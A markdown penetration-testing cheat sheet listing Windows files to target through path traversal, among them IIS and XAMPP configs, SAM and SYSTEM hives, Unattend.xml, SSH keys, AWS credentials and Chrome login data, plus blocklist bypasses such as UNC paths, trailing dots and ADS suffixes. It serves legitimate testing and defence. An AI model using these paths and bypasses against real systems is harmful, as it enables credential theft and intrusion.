# Windows sensitive-file targets

## Highest-signal probes

| Path | Marker |
|---|---|
| `C:\Windows\win.ini` | `[fonts]`, `[extensions]` |
| `C:\Windows\System32\drivers\etc\hosts` | `127.0.0.1 localhost` |
| `C:\boot.ini` | `[boot loader]` (legacy, pre-Vista only) |
| `C:\Windows\System32\license.rtf` | RTF magic |
| `C:\Windows\debug\NetSetup.log` | domain-join history |

Slash direction: most Windows web stacks accept both `\` and `/`. Try `/` first — it survives more layers of URL handling and shell quoting.

## IIS / ASP.NET

- `C:\inetpub\wwwroot\web.config` — connection strings, machineKey
- `C:\Windows\System32\inetsrv\config\applicationHost.config` — full IIS config
- `C:\inetpub\logs\LogFiles\W3SVC1\*.log` — IIS access logs (log poisoning candidate)
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config`

## XAMPP / WAMP / dev stacks

- `C:\xampp\apache\conf\httpd.conf`
- `C:\xampp\php\php.ini`
- `C:\xampp\mysql\bin\my.ini`
- `C:\xampp\security\webdav.htpasswd`
- `C:\wamp\bin\apache\apache*\conf\httpd.conf`
- `C:\Program Files\MySQL\MySQL Server *\my.ini`

## Credentials / hashes (high impact)

- `C:\Windows\System32\config\SAM` — locked while running; readable only from a shadow copy / offline
- `C:\Windows\System32\config\SYSTEM` — paired with SAM for offline crack
- `C:\Windows\Repair\SAM`, `C:\Windows\Repair\SYSTEM` — old repair copies, sometimes readable
- `C:\Windows\Panther\Unattend.xml`, `C:\Windows\Panther\Unattended.xml` — install creds in plaintext/base64
- `C:\sysprep.inf`, `C:\sysprep\sysprep.xml`
- `C:\Users\<user>\NTUSER.DAT`

## User profile

- `C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\<user>\.aws\credentials`
- `C:\Users\<user>\.ssh\id_rsa`
- `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data`

## Path-traversal nuances on Windows

- 8.3 short names: `PROGRA~1` == `Program Files`, `DOCUME~1` == `Documents and Settings`. Useful when spaces are stripped.
- UNC paths: `\\127.0.0.1\C$\windows\win.ini` — sometimes succeeds when local paths are filtered, may also trigger SMB callback (out-of-band confirmation).
- Trailing dot/space: `C:\Windows\win.ini.` and `C:\Windows\win.ini ` both resolve.
- ADS: `web.config::$DATA` reads the file past naive blocklists.
